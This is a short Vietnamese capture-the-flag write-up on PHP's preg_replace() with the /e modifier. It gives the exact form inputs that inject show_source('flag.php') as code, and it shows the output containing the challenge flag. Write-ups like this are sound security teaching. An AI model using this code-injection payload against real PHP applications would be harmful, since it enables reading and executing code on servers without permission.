Tài liệu về lỗ hổng này thật sự phổ biến, ví dụ [link](https://medium.com/@isharaabeythissa/command-injection-preg-replace-php-function-exploit-fdf987f767df)

Hàm `preg_replace()` của php là hàm được dùng để thay thế 1 phần của string (substring cần thay thế viết dưới dạng regex //), và khi chỉnh `modifier` của regex thành `e`, ta sẽ khiến cho kết quả trả về có khả năng thực thi như 1 câu lệnh php bình thường. Vậy ta sẽ điền form như sau:

>search: /hello/e
>
>replace: show_source('flag.php')
>
>content: hello

kết quả:

` <?php$flag="pr3g_r3pl4c3_3_m0d1f13r_styl3";?> `1 